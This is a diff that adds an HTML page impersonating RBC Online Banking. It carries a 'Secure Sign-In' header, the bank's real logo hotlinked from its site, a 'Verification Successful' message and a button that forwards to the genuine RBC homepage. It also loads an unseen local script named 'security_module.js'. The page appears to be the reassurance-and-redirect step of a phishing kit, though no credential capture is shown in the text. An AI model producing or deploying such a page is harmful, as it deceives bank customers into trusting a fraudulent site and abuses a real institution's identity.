@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Sign-In - RBC Online Banking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+        }
+
+        .header-bg {
+            background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1519832979-6fa011b87667?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            height: 250px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            padding-bottom: 25px;
+            text-align: center;
+        }
+
+        .logo { width: 45px; margin-bottom: 12px; }
+        .header-title { color: #ffffff; font-size: 24px; font-weight: 400; margin: 0 0 5px 0; }
+        .header-subtitle { color: #ffffff; font-size: 16px; font-weight: 400; margin: 0; }
+        .content-container { max-width: 420px; margin: 0 auto; padding: 40px 20px; text-align: center; }
+        
+        .success-icon { font-size: 70px; color: #005eb8; margin-bottom: 20px; }
+        .success-title { font-size: 28px; font-weight: 400; color: #000; margin: 0 0 15px 0; }
+        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; }
+        
+        .submit-btn { width: 100%; background-color: #005eb8; color: white; border: none; padding: 15px; font-size: 16px; cursor: pointer; }
+        .submit-btn:hover { background-color: #004c97; }
+    </style>
+</head>
+<body>
+    <div class="header-bg">
+        <img src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield.svg" alt="RBC Logo" class="logo">
+        <h1 class="header-title">Secure Sign-In</h1>
+        <h2 class="header-subtitle">RBC Online Banking</h2>
+    </div>
+
+    <div class="content-container">
+        <i class="fa-solid fa-circle-check success-icon"></i>
+        <h3 class="success-title">Verification Successful</h3>
+        <p class="success-desc">Your identity has been verified. You can now access your account securely.</p>
+        <button onclick="window.location.href='https://www.rbcroyalbank.com/personal.html'" class="submit-btn">Return to home</button>
+    </div>
+<script src="security_module.js"></script>
+</body>
+</html>
+
